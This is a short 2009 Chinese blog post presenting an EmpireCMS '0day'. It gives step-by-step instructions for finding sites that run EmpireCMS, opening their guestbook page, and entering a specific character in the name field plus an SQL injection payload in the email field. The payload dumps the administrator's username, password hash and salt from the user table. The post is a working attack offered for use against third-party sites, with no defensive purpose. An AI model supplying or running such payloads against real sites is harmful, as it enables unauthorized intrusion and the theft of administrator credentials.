---
title: 帝国CMS网站程序0DAY
description: 帝国CMS网站程序0DAY：找到使用帝国CMS的站,网址后面直接加：e/tool/gbook/?bid=1出来的是帝国CMS的留言本,在姓名处写：縗联系邮箱处写：......
date: 2009-06-23 11:12:51
category: 漏洞信息
tags: ['EmpireCMS', '0day']
post_id: 897
alias: EmpireCMS-0day
ViewNums: 5713
---

[帝国CMS网站程序0DAY](/blog/empirecms-0day)：找到使用帝国CMS的站,网址后面直接加：

e/tool/gbook/?bid=1

出来的是[帝国CMS](/blog/empirecms-0day)的留言本,在姓名处写：

縗

联系邮箱处写：

,1,1,1,(select concat(username,0x5f,password,0x5f,rnd) from phome_enewsuser where userid=1),1,1,1,0,0,0)/*

提交后爆出账号密码

via：[amxking](http://amxking.bokee.com/)

